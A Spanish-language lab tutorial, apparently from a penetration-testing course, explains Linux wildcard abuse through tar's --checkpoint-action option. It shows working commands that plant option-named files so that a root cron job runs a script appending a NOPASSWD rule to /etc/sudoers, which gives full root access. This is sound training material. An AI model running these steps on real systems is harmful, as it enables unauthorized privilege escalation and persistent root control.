
# Abuso de comodines

Un carácter comodín se puede utilizar como reemplazo de otros caracteres y el shell lo interpreta antes de realizar otras acciones. Algunos ejemplos de comodines son:

<table data-header-hidden><thead><tr><th width="119"></th><th></th></tr></thead><tbody><tr><td><strong>Carácter</strong></td><td><strong>Significado</strong></td></tr><tr><td><code>*</code></td><td>Un asterisco que puede coincidir con cualquier número de caracteres en un nombre de archivo.</td></tr><tr><td><code>?</code></td><td>Coincide con un solo caracter.</td></tr><tr><td><code>[ ]</code></td><td>Los corchetes encierran caracteres y pueden coincidir con cualquiera de ellos en la posición definida.</td></tr><tr><td><code>~</code></td><td>Una tilde al principio se expande al nombre del directorio de inicio del usuario o puede tener otro nombre de usuario añadido para hacer referencia al directorio de inicio de ese usuario.</td></tr><tr><td><code>-</code></td><td>Un guión entre paréntesis indicará un rango de caracteres.</td></tr></tbody></table>

Un ejemplo de cómo se pueden utilizar de forma abusiva los comodines para la escalada de privilegios es el comando `tar`, un programa común para crear y extraer archivos. Si observamos la [página del manual](http://man7.org/linux/man-pages/man1/tar.1.html) del comando `tar`, vemos lo siguiente:

```shell-session
htb_student@NIX02:~$ man tar

<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

La opción `--checkpoint-action` permite ejecutar una acción `EXEC` cuando se alcanza un punto de control (es decir, ejecutar un comando arbitrario del sistema operativo una vez que se ejecuta el comando tar). Al crear archivos con estos nombres, cuando se especifica el comodín, `--checkpoint=1` y `--checkpoint-action=exec=sh root.sh` se pasan a tar como opciones de línea de comandos. Veamos esto en la práctica.

Considere el siguiente trabajo cron, que está configurado para realizar una copia de seguridad del contenido del directorio `/home/htb-student` y crear un archivo comprimido dentro de `/home/htb-student`. El trabajo cron está configurado para ejecutarse cada minuto, por lo que es un buen candidato para la escalada de privilegios.

```shell-session
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

Podemos aprovechar el comodín en el trabajo cron para escribir los comandos necesarios como nombres de archivo teniendo en cuenta lo anterior. Cuando se ejecuta el trabajo cron, estos nombres de archivo se interpretarán como argumentos y ejecutarán cualquier comando que especifiquemos.

```shell-session
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
```

Podemos comprobar y ver que se han creado los archivos necesarios.

```shell-session
htb-student@NIX02:~$ ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
```

Una vez que el trabajo cron se ejecute nuevamente, podemos verificar los privilegios de sudo recientemente agregados y `sudo su` para rootear directamente:

```shell-session
htb-student@NIX02:~$ sudo -l

Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```
